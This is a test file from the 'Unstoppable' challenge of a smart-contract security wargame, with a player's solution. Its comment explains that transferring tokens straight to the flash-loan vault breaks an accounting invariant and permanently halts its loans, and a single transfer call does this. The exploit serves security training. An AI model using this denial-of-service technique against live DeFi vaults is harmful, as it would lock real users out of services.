const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Unstoppable", function () {
  let deployer, player, someUser;
  let token, vault, receiverContract;

  const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
  const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, player, someUser] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    vault = await (
      await ethers.getContractFactory("UnstoppableVault", deployer)
    ).deploy(
      token.address,
      deployer.address, // owner
      deployer.address // fee recipient
    );
    expect(await vault.asset()).to.eq(token.address);

    await token.approve(vault.address, TOKENS_IN_VAULT);
    await vault.deposit(TOKENS_IN_VAULT, deployer.address);

    expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
    expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
    expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
    expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT)).to.eq(
      50000n * 10n ** 18n
    );

    await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(
      INITIAL_PLAYER_TOKEN_BALANCE
    );

    // Show it's possible for someUser to take out a flash loan
    receiverContract = await (
      await ethers.getContractFactory("ReceiverUnstoppable", someUser)
    ).deploy(vault.address);
    await receiverContract.executeFlashLoan(100n * 10n ** 18n);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    /*  Simply sending token to the vault contract will break the function flashLoan making the vault stop offering flash loans
        as tokens can also be sent using token transfer function without using the deposit function of the vault contract.
        
        Affected Line => if (convertToShares(totalSupply) != totalAssets()) revert InvalidBalance();
     */
    await token.transfer(vault.address, ethers.utils.parseEther("1"));
    const totalSupply = await vault.totalSupply();
    const totalAssets = await vault.totalAssets();
    const convertedShares = await vault.convertToShares(totalSupply);
    console.log("Total Supply: ", ethers.utils.formatEther(totalSupply));
    console.log("Total Assets: ", ethers.utils.formatEther(totalAssets));
    console.log("Converted Shares:", ethers.utils.formatEther(convertedShares));
    console.log(convertedShares != totalAssets);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // It is no longer possible to execute flash loans
    await expect(
      receiverContract.executeFlashLoan(100n * 10n ** 18n)
    ).to.be.reverted;
  });
});
